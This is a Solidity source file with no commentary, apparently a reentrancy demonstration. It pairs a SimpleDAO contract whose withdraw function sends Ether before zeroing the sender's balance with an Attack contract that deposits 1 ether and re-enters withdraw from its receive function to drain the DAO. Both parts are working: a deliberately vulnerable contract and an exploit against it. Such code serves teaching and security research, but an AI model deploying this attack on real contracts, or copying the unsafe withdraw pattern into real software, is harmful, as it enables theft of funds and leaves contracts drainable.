contract SimpleDAO {
    mapping(address => uint) public balances;

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() public {
        uint bal = balances[msg.sender];
        require(bal > 0);
        (bool sent, ) = msg.sender.call{value: bal}("");
        require(sent, "Failed to send Ether");
        balances[msg.sender] = 0;
    }

    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}

contract Attack {
    SimpleDAO public dao;
    uint256 constant public AMOUNT = 1 ether;

    constructor(address _daoAddress) {
        dao = SimpleDAO(_daoAddress);
    }

    receive() external payable {
        if (address(dao).balance >= AMOUNT) {
            dao.withdraw();
        }
    }

    function attack() external {
        dao.withdraw();
    }

    function deposit() external payable {
        require(msg.value >= AMOUNT);
        dao.deposit{value: AMOUNT}();
    }
}